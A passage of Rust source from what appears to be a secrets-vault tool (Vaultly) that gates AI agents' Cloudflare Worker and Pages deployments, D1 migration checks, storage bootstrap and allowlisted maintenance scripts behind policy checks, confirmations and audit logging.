                            cwd: Some(&target.project_dir),
                            timeout_ms: Some(1_800_000),
                            allowed_keys: Some(&allowed_keys),
                        },
                        ctx,
                        "DEPLOY_RUN",
                    )
                    .await?
                };
                if result.code != 0 {
                    return Err(VaultError::CommandFailed(
                        format!("Worker deployment for target '{}'", target.id),
                        result.code,
                        failure_output_detail(&result.stdout, &result.stderr),
                    ));
                }
                self.audit(
                    "DEPLOY",
                    &format!("target={} provider=worker status=success", target.id),
                    ctx,
                );
                Ok(DeploymentResult {
                    target: target.id.clone(),
                    provider: DeploymentProvider::Worker,
                    status: "success".into(),
                    deployment_id: None,
                    url: None,
                    files: 0,
                })
            }
        }
    }

    /// Execute an approved repository maintenance script against a registered
    /// deployment target (e.g. `migrate:apply`, `backup:d1`, `watchdog`).
    ///
    /// Security model (same guarantees as `deploy_target`, plus mutation
    /// gating):
    /// - The agent supplies only `targetId`, script NAME, and an optional
    ///   confirmation word. The command body is resolved from the
    ///   repository's own `package.json` — never from agent input.
    /// - The script name must be in the closed [`APPROVED_TARGET_SCRIPTS`]
    ///   allowlist; anything else is `policy_denied`.
    /// - Gated on `Operation::Run`, which is NOT in the default agent op set:
    ///   agents get `policy_denied` until a human grants `run` via policy
    ///   file. This is the `policy_denied for run` contract.
    /// - Mutating scripts additionally require the typed confirmation word
    ///   AND pass Vaultly's own pending-migration safety verdicts (defense
    ///   in depth alongside the repository's guards): any pending
    ///   destructive-but-unguarded migration, or any failure to verify,
    ///   refuses the execution fail-closed.
    /// - Cleared environment with a fixed credential key set, output
    ///   scrubbing, and audit — via `run_with_secrets`.
    pub async fn exec_target_script(
        &mut self,
        target: &DeploymentTarget,
        script_name: &str,
        confirm: Option<&str>,
        ctx: Option<&CallerContext>,
    ) -> Result<TargetExecResult> {
        target.validate().map_err(VaultError::Policy)?;
        self.op(ctx, Operation::Run, &target.vault)?;
        self.validate_agent_target(target, ctx)?;

        // Fail fast on unknown scripts and missing confirmations BEFORE
        // touching credentials or the network.
        let approved = approved_target_script(script_name).ok_or_else(|| {
            VaultError::Policy(format!(
                "Script '{}' is not an approved target maintenance script for '{}'. Approved: {}",
                script_name,
                target.id,
                APPROVED_TARGET_SCRIPTS
                    .iter()
                    .map(|s| s.name)
                    .collect::<Vec<_>>()
                    .join(", ")
            ))
        })?;
        if approved.mutating {
            if let Some(expected) = approved.confirm_word {
                if confirm != Some(expected) {
                    let msg = format!(
                        "Script '{}' mutates production. Re-run with confirm=\"{}\" to record intent.",
                        script_name, expected
                    );
                    return Err(VaultError::Policy(msg));
                }
            }
        }

        let account_id = self.cf_account_id(&target.vault)?;
        if account_id != target.account_id {
            return Err(VaultError::Policy(format!(
                "Deployment target '{}' is bound to a different Cloudflare account",
                target.id
            )));
        }

        // Repository root is the server working directory (run CLI/MCP from
        // the repository root); the target directory must be inside it.
        let root = fs::canonicalize(
            std::env::current_dir()
                .map_err(|e| VaultError::Policy(format!("cannot resolve repository root: {e}")))?,
        )
        .map_err(|e| VaultError::Policy(format!("cannot resolve repository root: {e}")))?;
        let target_dir = fs::canonicalize(&target.project_dir).map_err(|e| {
            VaultError::Policy(format!(
                "cannot resolve deployment target directory '{}': {e}",
                target.project_dir
            ))
        })?;
        if !target_dir.starts_with(&root) {
            return Err(VaultError::Policy(format!(
                "Agent exec target directory must be inside the current workspace: {}. \
Run this command from the repository that owns '{}' (its root or a subdirectory).",
                target_dir.display(),
                target.project_dir
            )));
        }
        let package_raw = fs::read_to_string(root.join("package.json"))
            .map_err(|e| VaultError::Policy(format!("cannot read repository package.json: {e}")))?;
        let package: Value = serde_json::from_str(&package_raw)
            .map_err(|e| VaultError::Policy(format!("invalid repository package.json: {e}")))?;
        if package
            .get("scripts")
            .and_then(|s| s.get(script_name))
            .and_then(Value::as_str)
            .is_none()
        {
            return Err(VaultError::Policy(format!(
                "Script '{}' is not defined in the repository package.json",
                script_name
            )));
        }

        // Defense in depth for mutations: Vaultly independently refuses when
        // it can see pending destructive-but-unguarded migrations, or when it
        // cannot verify migration safety at all (fail closed).
        if approved.mutating {
            let verdicts = self.target_d1_verdicts(target, ctx).await.map_err(|e| {
                VaultError::Policy(format!(
                    "Cannot verify migration safety for '{}': {e}. Refusing.",
                    target.id
                ))
            })?;
            let mut unsafe_files = Vec::new();
            let mut errored = Vec::new();
            for db in &verdicts {
                if let Some(err) = &db.error {
                    errored.push(format!("{}: {}", db.database_name, err));
                }
                for v in &db.verdicts {
                    if !v.safe {
                        unsafe_files.push(v.file.clone());
                    }
                }
            }
            if !unsafe_files.is_empty() || !errored.is_empty() {
                return Err(VaultError::Policy(format!(
                    "Refusing '{}' on '{}': unsafe pending migrations [{}]; unverifiable databases [{}].",
                    script_name,
                    target.id,
                    unsafe_files.join(", "),
                    errored.join("; ")
                )));
            }
        }

        let allowed = target_exec_allowed_keys();
        let root_str = root.to_string_lossy().to_string();
        let result = self
            .run_with_secrets(
                &target.vault,
                "npm",
                &["run".to_string(), script_name.to_string()],
                &RunOptions {
                    cwd: Some(root_str.as_str()),
                    timeout_ms: Some(1_800_000),
                    allowed_keys: Some(&allowed),
                },
                ctx,
                "EXEC_RUN",
            )
            .await?;
        if result.code != 0 {
            return Err(VaultError::CommandFailed(
                format!(
                    "Target maintenance script '{script_name}' for '{}'",
                    target.id
                ),
                result.code,
                failure_output_detail(&result.stdout, &result.stderr),
            ));
        }
        self.audit(
            "EXEC",
            &format!("target={} script={} status=success", target.id, script_name),
            ctx,
        );
        Ok(TargetExecResult {
            target: target.id.clone(),
            script: script_name.to_string(),
            status: "success".into(),
            code: 0,
            injected_keys: result.secrets_injected,
            scrubbed: result.scrubbed,
        })
    }

    /// Read-only preflight for a deployment target: worker existence, worker
    /// secret names, and per-D1-database applied/pending migrations with
    /// safety verdicts. No mutations, no credential values. Gated on the
    /// `Deploy` operation (granted to agents by default) since preflight is
    /// part of the deployment workflow.
    pub async fn preflight_target(
        &mut self,
        target: &DeploymentTarget,
        ctx: Option<&CallerContext>,
    ) -> Result<TargetPreflight> {
        target.validate().map_err(VaultError::Policy)?;
        self.op(ctx, Operation::Deploy, &target.vault)?;
        self.validate_agent_target(target, ctx)?;

        let account_id = self.cf_account_id(&target.vault)?;
        if account_id != target.account_id {
            return Err(VaultError::Policy(format!(
                "Deployment target '{}' is bound to a different Cloudflare account",
                target.id
            )));
        }

        let (_id, workers) = self.list_workers(&target.vault, ctx).await?;
        let worker_found = workers.iter().any(|w| w == &target.project);
        let worker_secret_names = match self
            .worker_secrets(&target.vault, &target.project, "list", None, None, ctx)
            .await
        {
            Ok(r) => extract_secret_names(&r.data),
            Err(_) => Vec::new(),
        };
        let databases = self
            .target_d1_verdicts(target, ctx)
            .await
            .unwrap_or_default();

        Ok(TargetPreflight {
            target: target.id.clone(),
            account_id,
            worker_found,
            worker_secret_names,
            databases,
        })
    }

    /// Inspect every D1 database bound by the target's Wrangler config:
    /// remote applied migrations vs local files, with safety verdicts.
    /// Per-database failures are captured in `D1Preflight.error`; an
    /// unreadable config fails the whole check (fail closed).
    async fn target_d1_verdicts(
        &mut self,
        target: &DeploymentTarget,
        ctx: Option<&CallerContext>,
    ) -> Result<Vec<D1Preflight>> {
        let target_dir = PathBuf::from(&target.project_dir);
        let config_path = Self::target_wrangler_config(&target_dir).ok_or_else(|| {
            VaultError::Policy(format!(
                "No Wrangler config found in target directory '{}'",
                target.project_dir
            ))
        })?;
        let bindings = wrangler_d1_bindings(&config_path).map_err(VaultError::Policy)?;
        let config_dir = config_path
            .parent()
            .map(Path::to_path_buf)
            .unwrap_or_else(|| target_dir.clone());
        let mut out = Vec::new();
        for binding in bindings {
            out.push(
                self.d1_binding_verdict(target, &binding, &config_dir, ctx)
                    .await,
            );
        }
        Ok(out)
    }

    /// First existing default Wrangler config in a target directory.
    fn target_wrangler_config(target_dir: &Path) -> Option<PathBuf> {
        ["wrangler.json", "wrangler.jsonc", "wrangler.toml"]
            .iter()
            .map(|name| target_dir.join(name))
            .find(|path| path.is_file())
    }

    async fn d1_binding_verdict(
        &mut self,
        target: &DeploymentTarget,
        binding: &crate::deploy::D1Binding,
        config_dir: &Path,
        ctx: Option<&CallerContext>,
    ) -> D1Preflight {
        let blank = |error: String| D1Preflight {
            database_name: binding.database_name.clone(),
            database_id: binding.database_id.clone(),
            applied: 0,
            pending: Vec::new(),
            verdicts: Vec::new(),
            error: Some(error),
        };
        // 1. Verify the database exists in the bound account.
        let db_path = format!("/d1/database/{}", urlencode(&binding.database_id));
        match self
            .cloudflare_account_api(&target.vault, "GET", &db_path, None, ctx)
            .await
        {
            Ok(r) if r.status < 400 => {}
            Ok(r) => {
                return blank(format!("database lookup failed: HTTP {}", r.status));
            }
            Err(e) => return blank(format!("database lookup failed: {e}")),
        }
        // 2. Remote applied migrations (missing table = fresh database).
        let query_path = format!("/d1/database/{}/query", urlencode(&binding.database_id));
        let applied = match self
            .cloudflare_account_api(
                &target.vault,
                "POST",
                &query_path,
                Some(serde_json::json!({"sql": "SELECT name FROM d1_migrations"})),
                ctx,
            )
            .await
        {
            Ok(r) => match parse_d1_migration_query(&r.data) {
                Ok(names) => names,
                Err(e) => return blank(format!("migration query failed: {e}")),
            },
            Err(e) => return blank(format!("migration query failed: {e}")),
        };
        // 3. Local migration files.
        let migrations_dir = binding.migrations_dir.as_deref().unwrap_or("migrations");
        let dir = config_dir.join(migrations_dir);
        let mut local_files: Vec<String> = match fs::read_dir(&dir) {
            Ok(entries) => entries
                .filter_map(|e| e.ok())
                .map(|e| e.file_name().to_string_lossy().to_string())
                .filter(|n| is_migration_file(n))
                .collect(),
            Err(e) => {
                return blank(format!(
                    "cannot list local migrations '{}': {e}",
                    dir.display()
                ))
            }
        };
        local_files.sort();
        // 4. Diff + safety verdicts (pending files only).
        let pending = pending_migrations(&local_files, &applied);
        let mut verdicts = Vec::new();
        for file in &pending {
            let sql = fs::read_to_string(dir.join(file)).unwrap_or_default();
            verdicts.push(migration_safety_verdict(file, &sql));
        }
        D1Preflight {
            database_name: binding.database_name.clone(),
            database_id: binding.database_id.clone(),
            applied: applied.len(),
            pending,
            verdicts,
            error: None,
        }
    }

    /// Discover and idempotently register a deployment target from a local
    /// Wrangler config. The agent supplies only the selected Vaultly vault and
    /// local config path; account identity comes from the vault and the
    /// Cloudflare resource must already exist in that account.
    /// Default Wrangler config in a project directory: exactly one of
    /// wrangler.json/jsonc/toml. Anything else (zero, several) means a
    /// legacy layout where storage bootstrap stays out of the way.
    fn default_wrangler_config(project_dir: &str) -> Option<PathBuf> {
        let dir = Path::new(project_dir);
        let configs: Vec<PathBuf> = ["wrangler.json", "wrangler.jsonc", "wrangler.toml"]
            .iter()
            .map(|name| dir.join(name))
            .filter(|path| path.is_file())
            .collect();
        if configs.len() == 1 {
            configs.into_iter().next()
        } else {
            None
        }
    }

    /// Bucket names from an R2 list response, accepting both the bare-array
    /// shape and the `{"buckets": [...]}` object shape Cloudflare emits.
    fn r2_bucket_names(payload: &Value) -> Vec<String> {
        let items = match payload.get("result") {
            Some(Value::Array(arr)) => arr.clone(),
            Some(obj) => obj
                .get("buckets")
                .and_then(Value::as_array)
                .cloned()
                .unwrap_or_default(),
            None => Vec::new(),
        };
        items
            .iter()
            .filter_map(|b| b.get("name").and_then(Value::as_str))
            .map(|s| s.to_string())
            .collect()
    }

    /// Ensure the D1 databases and R2 buckets declared in the target's own
    /// Wrangler config exist in the target's account, creating the missing
    /// ones so a first deploy succeeds end to end.
    ///
    /// Target-bound provisioning guarantees (same as Pages first-boot):
    /// - Only names declared in the repository's own config, only in the
    ///   vault-bound account. No arbitrary names, no arbitrary accounts.
    /// - `remote: true` R2 references are never created (owned elsewhere).
    /// - New D1 ids are patched back into the same config file so later
    ///   preflight/migrate/deploy keep pointing at the account's database.
    /// - Every creation is audited; API outputs are scrubbed; only names
    ///   (never values) reach results or errors.
    ///
    /// Runs only when the project directory holds exactly one default
    /// Wrangler config; legacy layouts keep prior behavior untouched.
    async fn bootstrap_target_storage(
        &mut self,
        target: &DeploymentTarget,
        ctx: Option<&CallerContext>,
    ) -> Result<()> {
        let Some(config_path) = Self::default_wrangler_config(&target.project_dir) else {
            return Ok(());
        };

        // ── D1 ──
        let d1 = wrangler_d1_bindings(&config_path).map_err(VaultError::Policy)?;
        if !d1.is_empty() {
            let list = self
                .cloudflare_account_api(&target.vault, "GET", "/d1/database", None, ctx)
                .await?;
            if !(200..300).contains(&list.status) {
                return Err(VaultError::CloudflareResponse(format!(
                    "D1 discovery failed with HTTP {}",
                    list.status
                )));
            }
            let known: Vec<(String, String)> = list
                .data
                .get("result")
                .and_then(Value::as_array)
                .map(|arr| {
                    arr.iter()
                        .filter_map(|db| {
                            let name = db.get("name")?.as_str()?.to_string();
                            let uuid = db.get("uuid")?.as_str()?.to_string();
                            Some((name, uuid))
                        })
                        .collect()
                })
                .unwrap_or_default();
            let mut raw: Option<String> = None;
            for binding in &d1 {
                match known
                    .iter()
                    .find(|(name, _)| name == &binding.database_name)
                {
                    Some((_, uuid)) if uuid == &binding.database_id => {}
                    Some((_, uuid)) => {
                        let text =
                            raw.get_or_insert(fs::read_to_string(&config_path).map_err(|e| {
                                VaultError::Policy(format!(
                                    "cannot re-read Wrangler config '{}': {e}",
                                    config_path.display()
                                ))
                            })?);
                        *text = patch_d1_database_id(text, &binding.database_name, uuid)
                            .map_err(VaultError::Policy)?;
                        self.audit(
                            "D1_REUSED",
                            &format!("database={} target={}", binding.database_name, target.id),
                            ctx,
                        );
                    }
                    None => {
                        let created = self
                            .cloudflare_account_api(
                                &target.vault,
                                "POST",
                                "/d1/database",
                                Some(serde_json::json!({ "name": binding.database_name })),
                                ctx,
                            )
                            .await?;
                        if !(200..300).contains(&created.status) {
                            return Err(VaultError::CloudflareResponse(format!(
                                "D1 creation failed with HTTP {}",
                                created.status
                            )));
                        }
                        let uuid = created
                            .data
                            .get("result")
                            .and_then(|r| r.get("uuid"))
                            .and_then(Value::as_str)
                            .ok_or_else(|| {
                                VaultError::CloudflareResponse(format!(
                                    "D1 '{}' creation returned no database id; create it manually and set database_id",
                                    binding.database_name
                                ))
                            })?;
                        let text =
                            raw.get_or_insert(fs::read_to_string(&config_path).map_err(|e| {
                                VaultError::Policy(format!(
                                    "cannot re-read Wrangler config '{}': {e}",
                                    config_path.display()
                                ))
                            })?);
                        *text = patch_d1_database_id(text, &binding.database_name, uuid)
                            .map_err(VaultError::Policy)?;
                        self.audit(
                            "D1_CREATED",
                            &format!("database={} target={}", binding.database_name, target.id),
                            ctx,
                        );
                    }
                }
            }
            if let Some(text) = raw {
                fs::write(&config_path, text).map_err(|e| {
                    VaultError::Policy(format!(
                        "cannot update database_id in '{}': {e}; set it manually",
                        config_path.display()
                    ))
                })?;
            }
        }

        // ── R2 ──
        let r2 = wrangler_r2_bindings(&config_path).map_err(VaultError::Policy)?;
        let mut wanted: Vec<String> = Vec::new();
        for bucket in &r2 {
            if bucket.remote {
                continue;
            }
            for name in [&bucket.bucket_name]
                .into_iter()
                .chain(bucket.preview_bucket_name.as_ref())
            {
                if !wanted.iter().any(|w| w == name) {
                    wanted.push(name.clone());
                }
            }
        }
        if !wanted.is_empty() {
            let list = self
                .cloudflare_account_api(&target.vault, "GET", "/r2/buckets", None, ctx)
                .await?;
            if !(200..300).contains(&list.status) {
                return Err(VaultError::CloudflareResponse(format!(
                    "R2 discovery failed with HTTP {}",
                    list.status
                )));
            }
            let existing = Self::r2_bucket_names(&list.data);
            for name in &wanted {
                if existing.iter().any(|b| b == name) {
                    continue;
                }
                let created = self
                    .cloudflare_account_api(
                        &target.vault,
                        "POST",
                        "/r2/buckets",
                        Some(serde_json::json!({ "name": name })),
                        ctx,
                    )
                    .await?;
                if !(200..300).contains(&created.status) {
                    return Err(VaultError::CloudflareResponse(format!(
                        "R2 bucket creation failed with HTTP {}",
                        created.status
                    )));
                }
                self.audit(
                    "R2_CREATED",
                    &format!("bucket={} target={}", name, target.id),
                    ctx,
                );
            }
        }
        Ok(())
    }

    pub async fn adopt_deployment_target(
        &mut self,
        vault_name: &str,
        config_path: &Path,
        ctx: Option<&CallerContext>,
        allow_create: bool,
    ) -> Result<DeploymentTarget> {
        self.op(ctx, Operation::Deploy, vault_name)?;
        let account_id = self.cf_account_id(vault_name)?;
        let spec = discover_deployment_spec(config_path).map_err(VaultError::Policy)?;

        let resource_exists = match spec.provider {
            DeploymentProvider::Pages => {
                let response = self
                    .cloudflare_account_api(vault_name, "GET", "/pages/projects", None, ctx)
                    .await?;
                if !(200..300).contains(&response.status) {
                    return Err(VaultError::CloudflareResponse(format!(
                        "Pages discovery failed with HTTP {}",
                        response.status
                    )));
                }
                response
                    .data
                    .get("result")
                    .and_then(Value::as_array)
                    .map(|projects| {
                        projects.iter().any(|project| {
                            project.get("name").and_then(Value::as_str) == Some(&spec.project)
                        })
                    })
                    .unwrap_or(false)
            }
            DeploymentProvider::Worker => {
                let (resolved_account, workers) = self.list_workers(vault_name, ctx).await?;
                if resolved_account != account_id {
                    return Err(VaultError::Policy(
                        "Cloudflare account identity changed during target adoption".into(),
                    ));
                }
                workers.iter().any(|worker| worker == &spec.project)
            }
        };
        if !resource_exists && !allow_create {
            return Err(VaultError::Policy(format!(
                "Cloudflare {} '{}' was not found in the selected account",
                match spec.provider {
                    DeploymentProvider::Pages => "Pages project",
                    DeploymentProvider::Worker => "Worker",
                },
                spec.project
            )));
        }
        // End-to-end provisioning: with explicit opt-in, a missing resource
        // is registered anyway and created on first deploy (Workers via the
        // repository's `npm run deploy`; D1/R2 via deploy-time bootstrap of
        // the config's own bindings). Account identity is still verified
        // from the vault above, and only the config-derived project name in
        // that account can ever be created — no arbitrary names.
        let provisioning = !resource_exists;

        let target = DeploymentTarget {
            id: spec.target_id(&account_id),
            provider: spec.provider,
            vault: vault_name.to_string(),
            account_id,
            project: spec.project,
            project_dir: spec.project_dir.to_string_lossy().to_string(),
            build_command: spec.build_command,
            output_dir: spec.output_dir,
            branch: None,
            worker_package_deploy: spec.worker_package_deploy,
            created_at: chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Millis, true),
        };
        target.validate().map_err(VaultError::Policy)?;

        let store = self.store();
        let mut targets = store.load_deployment_targets()?;
        if let Some(existing) = targets.iter().find(|existing| existing.id == target.id) {
            if !same_target_identity(existing, &target) {
                return Err(VaultError::Policy(format!(
                    "target '{}' already exists with different deployment metadata",
                    target.id
                )));
            }
            self.audit(
                "TARGET_ADOPT",
                &format!("target={} status=already_registered", target.id),
                ctx,
            );
            return Ok(existing.clone());
        }
        targets.push(target.clone());
        store.save_deployment_targets(&targets)?;
        self.audit(
            "TARGET_ADOPT",
            &format!(
                "target={} provider={:?} project={} vault={} provisioning={}",
                target.id, target.provider, target.project, target.vault, provisioning
            ),
            ctx,
        );
        Ok(target)
    }

    async fn deploy_pages_files(
        &mut self,
        target: &DeploymentTarget,
        output_dir: &Path,
        ctx: Option<&CallerContext>,
    ) -> Result<DeploymentResult> {
        if !output_dir.is_dir() {
            return Err(VaultError::Policy(format!(
                "Pages output directory does not exist for target '{}'",
                target.id
            )));
        }
        let files = collect_deploy_files(output_dir)?;
        if files.is_empty() {
            return Err(VaultError::Policy(format!(
                "Pages output directory is empty for target '{}'",
                target.id
            )));
        }
        if files.len() > 20_000 {
            return Err(VaultError::Policy(
                "Pages deployment exceeds 20,000 files".into(),
            ));
        }

        let secrets = self.read_secrets(&target.vault)?;
        let api_headers = Self::build_cf_headers(&target.vault, &secrets)?;
        let client = reqwest::Client::new();
        let base = format!(
            "{}/accounts/{}/pages/projects/{}",
            self.cf_base,
            urlencode(&target.account_id),
            urlencode(&target.project)
        );

        let token_response = send_with_retry(
            client
                .get(format!("{}/upload-token", base))
                .headers(api_headers.clone()),
        )
        .await?;
        let mut token_status = token_response.status();
        let mut token_data: Value = token_response.json().await?;
        if token_status.as_u16() == 404 {
            // Target-bound first-boot: the registered target already authorizes
            // this exact account + project (human-registered, validated), so
            // create that Pages project before retrying — mirroring how a
            // first Worker deploy creates the Worker. No arbitrary names:
            // only target.project in target.account_id.
            let create_body = serde_json::json!({
                "name": target.project,
                "production_branch": target.branch.clone().unwrap_or_else(|| "main".to_string()),
            });
            let create_res = self
                .cloudflare_account_api(
                    &target.vault,
                    "POST",
                    "/pages/projects",
                    Some(create_body),
                    ctx,
                )
                .await?;
            if !(200..300).contains(&create_res.status) {
                return Err(VaultError::CloudflareResponse(format!(
                    "Pages project auto-create failed with HTTP {}: {}",
                    create_res.status,
                    cloudflare_response_detail(&create_res.data)
                )));
            }
            self.audit(
                "DEPLOY",
                &format!(
                    "target={} provider=pages project_created={}",
                    target.id, target.project
                ),
                ctx,
            );
            let retry_response = send_with_retry(
                client
                    .get(format!("{}/upload-token", base))
                    .headers(api_headers.clone()),
            )
            .await?;
            token_status = retry_response.status();
            token_data = retry_response.json().await?;
        }
        if !token_status.is_success() {
            return Err(VaultError::CloudflareResponse(format!(
                "upload-token failed with HTTP {}",
                token_status.as_u16()
            )));
        }
        let jwt = token_data
            .get("result")
            .and_then(|r| r.get("jwt"))
            .and_then(Value::as_str)
            .ok_or_else(|| {
                VaultError::CloudflareResponse(
                    "Cloudflare did not return a Pages upload token".into(),
                )
            })?;

        let manifest: Map<String, Value> = files
            .iter()
            .map(|file| {
                (
                    format!("/{}", file.relative),
                    Value::String(file.hash.clone()),
                )
            })
            .collect();
        let hashes: Vec<&str> = files.iter().map(|f| f.hash.as_str()).collect();
        let missing_response = send_with_retry(
            client
                .post(format!("{}/pages/assets/check-missing", self.cf_base))
                .bearer_auth(jwt)
                .json(&serde_json::json!({"hashes": hashes})),
        )
        .await?;
        if !missing_response.status().is_success() {
            return Err(VaultError::CloudflareResponse(format!(
                "asset check failed with HTTP {}",
                missing_response.status().as_u16()
            )));
        }
        let missing_data: Value = missing_response.json().await?;
        let missing: std::collections::HashSet<String> = missing_data
            .get("result")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .filter_map(Value::as_str)
            .map(str::to_string)
            .collect();

        for chunk in files
            .iter()
            .filter(|f| missing.contains(&f.hash))
            .collect::<Vec<_>>()
            .chunks(25)
        {
            let body: Vec<Value> = chunk
                .iter()
                .map(|file| {
                    serde_json::json!({
                        "base64": true,
                        "key": file.hash,
                        "metadata": {"contentType": content_type(&file.relative)},
                        "value": base64::engine::general_purpose::STANDARD.encode(&file.bytes),
                    })
                })
                .collect();
            let response = send_with_retry(
                client
                    .post(format!("{}/pages/assets/upload", self.cf_base))
                    .bearer_auth(jwt)
                    .json(&body),
            )
            .await?;
            if !response.status().is_success() {
                return Err(VaultError::CloudflareResponse(format!(
                    "asset upload failed with HTTP {}",
                    response.status().as_u16()
                )));
            }
        }

        // Wrangler registers the uploaded hashes before creating the
        // deployment. Without this step, the deployment record can be
        // accepted while its assets remain unavailable at the Pages URL.
        let upsert_response = send_with_retry(
            client
                .post(format!("{}/pages/assets/upsert-hashes", self.cf_base))
                .bearer_auth(jwt)
                .json(&serde_json::json!({"hashes": hashes})),
        )
        .await?;
        if !upsert_response.status().is_success() {
            return Err(VaultError::CloudflareResponse(format!(
                "asset hash registration failed with HTTP {}",
                upsert_response.status().as_u16()
            )));
        }

        let mut form =
            reqwest::multipart::Form::new().text("manifest", serde_json::to_string(&manifest)?);
        if let Some(branch) = &target.branch {
            form = form.text("branch", branch.clone());
        }
        form = form.text("pages_build_output_dir", target.output_dir.clone());
        // Deployment creation is a multipart POST and reqwest cannot clone
        // multipart request bodies for retry. It also creates a new remote
        // deployment, so retrying it automatically could create duplicates.
        let response = send_once(
            client
                .post(format!("{}/deployments", base))
                .headers(api_headers)
                .multipart(form),
        )
        .await?;
        let status = response.status();
        let data: Value = response.json().await?;
        if !status.is_success() {
            return Err(VaultError::CloudflareResponse(format!(
                "Pages deployment failed with HTTP {}: {}",
                status.as_u16(),
                cloudflare_response_detail(&data)
            )));
        }
        let result = data.get("result").cloned().unwrap_or_default();
        let deployment_id = result.get("id").and_then(Value::as_str).map(str::to_string);
        let url = result
            .get("url")
            .and_then(Value::as_str)
            .map(str::to_string)
            .or_else(|| {
                result
                    .get("aliases")
                    .and_then(Value::as_array)
                    .and_then(|a| a.first())
                    .and_then(Value::as_str)
                    .map(str::to_string)
            });
        self.audit(
            "DEPLOY",
            &format!("target={} provider=pages files={}", target.id, files.len()),
            ctx,
        );
        Ok(DeploymentResult {
            target: target.id.clone(),
            provider: DeploymentProvider::Pages,
            status: "success".into(),
            deployment_id,
            url,
            files: files.len(),
        })
    }

    // ─── Spawn (timeout + output cap) ─────────────────────

    async fn spawn(
        &mut self,
        command: &str,
        args: &[String],
        env: &[(String, String)],
        cwd: Option<&str>,
        timeout_ms: u64,
    ) -> Result<RunResult> {
        let injected_keys: Vec<String> = env.iter().map(|(k, _)| k.clone()).collect();
        let mut child = TokioCommand::new(command);
        child
            .env_clear()
            .kill_on_drop(true)
            .args(args)
            .envs(env.iter().map(|(k, v)| (k, v)))
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        // Keep command discovery working after env_clear(). Secrets remain
        // isolated because only PATH is restored from the parent process;
        // all other inherited environment variables stay excluded.
        if let Some(path) = std::env::var_os("PATH") {
            child.env("PATH", path);
        }
        if let Some(dir) = cwd {
            child.current_dir(dir);
        }

        #[cfg(unix)]
        child.process_group(0);

        let mut child = child
            .spawn()
            .map_err(|e| VaultError::Policy(format!("Failed to start '{}': {}", command, e)))?;
        #[cfg(unix)]
        let group = CommandGroup(child.id().unwrap_or(0) as i32);
        let mut stdout = child.stdout.take().ok_or_else(|| {
            VaultError::CommandSpawn(command.to_string(), "stdout pipe missing".into())
        })?;
        let mut stderr = child.stderr.take().ok_or_else(|| {
            VaultError::CommandSpawn(command.to_string(), "stderr pipe missing".into())
        })?;

        // Read both streams in parallel so a chatty stderr can't deadlock stdout
        let mut out_task = tokio::spawn(async move { read_capped(&mut stdout).await });
        let mut err_task = tokio::spawn(async move { read_capped(&mut stderr).await });

        let status = tokio::select! {
            status = child.wait() => status,
            _ = tokio::time::sleep(Duration::from_millis(timeout_ms)) => {
                #[cfg(unix)]
                drop(group);
                let _ = child.kill().await;
                let _ = child.wait().await;
                let (out, out_trunc) = finish_output(&mut out_task).await;
                let (err, err_trunc) = finish_output(&mut err_task).await;
                let stderr = format!(
                    "{}\n⏱ Command timed out after {}s and was killed.\n",
                    fmt_buf(err, err_trunc),
                    timeout_ms / 1000
                );
                return Ok(RunResult {
                    stdout: fmt_buf(out, out_trunc),
                    stderr,
                    code: 124,
                    secrets_injected: injected_keys,
                    scrubbed: false,
                });
            }
        };

        #[cfg(unix)]
        drop(group);
        let (out, out_trunc) = finish_output(&mut out_task).await;
        let (err, err_trunc) = finish_output(&mut err_task).await;

        Ok(RunResult {
            stdout: fmt_buf(out, out_trunc),
            stderr: fmt_buf(err, err_trunc),
            code: status.ok().and_then(|s| s.code()).unwrap_or(1),
            secrets_injected: injected_keys,
            scrubbed: false,
        })
    }

    // ─── Cloudflare API ───────────────────────────────────

    fn build_cf_headers(
        vault_name: &str,
        secrets: &Map<String, Value>,
    ) -> Result<reqwest::header::HeaderMap> {
        // Keep authentication separate from the request body type. JSON
        // requests set their own content type through `.json(...)`, while
        // Pages deployments require reqwest's multipart boundary.
        let mut headers = reqwest::header::HeaderMap::new();
        let token = secrets.get("CLOUDFLARE_API_TOKEN").and_then(|v| v.as_str());
        let email = secrets.get("CLOUDFLARE_EMAIL").and_then(|v| v.as_str());
        let api_key = secrets.get("CLOUDFLARE_API_KEY").and_then(|v| v.as_str());

        if let Some(token) = token {
            headers.insert(
                reqwest::header::AUTHORIZATION,
                reqwest::header::HeaderValue::from_str(&format!("Bearer {}", token))
                    .map_err(|e| VaultError::Policy(e.to_string()))?,
            );
            return Ok(headers);
        }
        if let (Some(email), Some(api_key)) = (email, api_key) {
            headers.insert(
                "X-Auth-Email",
                reqwest::header::HeaderValue::from_str(email)
                    .map_err(|e| VaultError::Policy(e.to_string()))?,
            );
            headers.insert(
                "X-Auth-Key",
                reqwest::header::HeaderValue::from_str(api_key)
                    .map_err(|e| VaultError::Policy(e.to_string()))?,
            );
            return Ok(headers);
        }

        let found: Vec<String> = secrets.keys().cloned().collect();
        let found = if found.is_empty() {
            "(empty)".to_string()
        } else {
            found.join(", ")
        };
        let hint = if token.is_none() && email.is_none() {
            "Need CLOUDFLARE_API_TOKEN".to_string()
        } else if token.is_none() {
            "Need CLOUDFLARE_API_KEY (email present but key missing)".to_string()
        } else {
            "Need CLOUDFLARE_EMAIL (key present but email missing)".to_string()
        };
        Err(VaultError::CloudflareCredentials(
            vault_name.to_string(),
            format!("{} Found: {}", hint, found),
        ))
    }

    fn cf_secret_values(secrets: &Map<String, Value>) -> Vec<&str> {
        [
            "CLOUDFLARE_API_TOKEN",
            "CLOUDFLARE_EMAIL",
            "CLOUDFLARE_API_KEY",
        ]
        .iter()
        .filter_map(|k| secrets.get(*k).and_then(|v| v.as_str()))
        .collect()
    }

    pub async fn cloudflare_api(
        &mut self,
        vault_name: &str,
        method: &str,
        api_path: &str,
        body: Option<Value>,
        ctx: Option<&CallerContext>,
    ) -> Result<ApiResult> {
        self.op(ctx, Operation::CfApi, vault_name)?;
        let secrets = self.read_secrets(vault_name)?;
        let headers = Self::build_cf_headers(vault_name, &secrets)?;

        self.audit(
            "CF_API",
            &format!("{} {} (vault={})", method, api_path, vault_name),
            ctx,
        );

        let url = format!("{}{}", self.cf_base, api_path);
        let client = reqwest::Client::new();
        let mut req = client.request(
            reqwest::Method::from_bytes(method.as_bytes())
                .map_err(|e| VaultError::Policy(e.to_string()))?,
            &url,
        );
        req = req.headers(headers);
        if let Some(b) = body {
            req = req.json(&b);
        }

        let res = send_with_retry(req)
            .await
